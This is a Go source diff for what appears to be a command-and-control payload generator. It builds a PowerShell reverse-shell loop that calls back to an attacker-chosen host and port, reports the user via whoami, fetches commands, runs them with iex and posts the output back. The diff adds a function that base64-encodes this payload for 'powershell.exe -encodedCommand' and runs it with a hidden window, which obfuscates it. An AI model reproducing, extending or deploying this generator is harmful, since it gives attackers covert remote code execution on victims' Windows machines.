@@ -1,6 +1,9 @@
 package main
 
-import "math/rand"
+import (
+	"encoding/base64"
+	"math/rand"
+)
 
 func generate_random_id() string {
 	var id string
@@ -24,12 +27,25 @@ func generate(os string, lhost string, lport string) string {
 
 	switch os {
 		case("windows"):
-			result = Fore["GREEN"]+`for (;;) {try {$_sess="`+generate_random_id()+`";$_host="`+lhost+`:`+lport+`";$_oper="windows";$_prot="http://";$_user=whoami;$_tmp=(Invoke-WebRequest $_prot$_host/ -UseBasicParsing -Headers @{ "Joker"="*";"Auth"=$_sess;"Self"=$_user;"Os"=$_oper } ).Content;for (;;) {try {$_tmp=(Invoke-WebRequest $_prot$_host/ -UseBasicParsing -Headers @{ "Joker"="?";"Auth"=$_sess } ).Content;if ($_tmp -ne "None") {$_call = (iex $_tmp 2>&1 | Out-String );$_tmp=(Invoke-WebRequest -Method POST $_prot$_host/ -UseBasicParsing -Headers @{ "Joker"="+";"Auth"=$_sess } -Body $_call ).Content;} } catch {$_call=$_;$_tmp=(Invoke-WebRequest -Method POST $_prot$_host/ -UseBasicParsing -Headers @{ "Joker"="+";"Auth"=$_sess } -Body $_call ).Content;}Sleep 1}} catch {}}`+Fore["RESET"]
-		default:
+			result = `for (;;) {try {$_sess="`+generate_random_id()+`";$_host="`+lhost+`:`+lport+`";$_oper="windows";$_prot="http://";$_user=whoami;$_tmp=(Invoke-WebRequest $_prot$_host/ -UseBasicParsing -Headers @{ "Joker"="*";"Auth"=$_sess;"Self"=$_user;"Os"=$_oper } ).Content;for (;;) {try {$_tmp=(Invoke-WebRequest $_prot$_host/ -UseBasicParsing -Headers @{ "Joker"="?";"Auth"=$_sess } ).Content;if ($_tmp -ne "None") {$_call = (iex $_tmp 2>&1 | Out-String );$_tmp=(Invoke-WebRequest -Method POST $_prot$_host/ -UseBasicParsing -Headers @{ "Joker"="+";"Auth"=$_sess } -Body $_call ).Content;} } catch {$_call=$_;$_tmp=(Invoke-WebRequest -Method POST $_prot$_host/ -UseBasicParsing -Headers @{ "Joker"="+";"Auth"=$_sess } -Body $_call ).Content;}Sleep 1}} catch {}}`
+            result = Fore["GREEN"]+"powershell.exe -encodedCommand "+powershell_base64_encode(result)+" -WindowStyle Hidden"+Fore["RESET"]
+        default:
 			result = "The OS is currently not available."
 	}
 
 	return result
+}
+
+
+func powershell_base64_encode(text string) string {
+    leText := make([]byte, len(text)*2) // Allocate a slice to hold the modified input
+    for i, c := range []byte(text) {
+            leText[i*2] = c   // Copy the original byte
+            leText[i*2+1] = 0 // Add a zero byte after each byte
+    }
+    encoded := base64.StdEncoding.EncodeToString(leText)
+    return (encoded)
+
 }
 
 /*
